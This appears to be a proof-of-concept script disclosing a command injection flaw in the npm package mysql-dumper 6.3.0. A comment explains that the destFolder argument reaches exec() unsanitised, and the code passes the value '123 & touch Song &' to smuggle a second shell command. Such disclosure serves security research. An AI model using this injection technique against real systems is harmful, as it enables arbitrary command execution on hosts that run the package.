/**
 * mysql-dumper@6.3.0 is vulnerable to command injection.
 * the injection point is located in line 21 of file "out/publish.js" in function dumpDatabase(),
 * which is called by the index file "lib/index.js" of this package.
 * the first argument "destFolder" in fuction dumpDatabase() can be used as part of the arg of exec function without 
 * any sanitization. 
 *
 */

var root = require("mysql-dumper");
var attack_code ="123 & touch Song &";
root.run(123,attack_code,false,false);
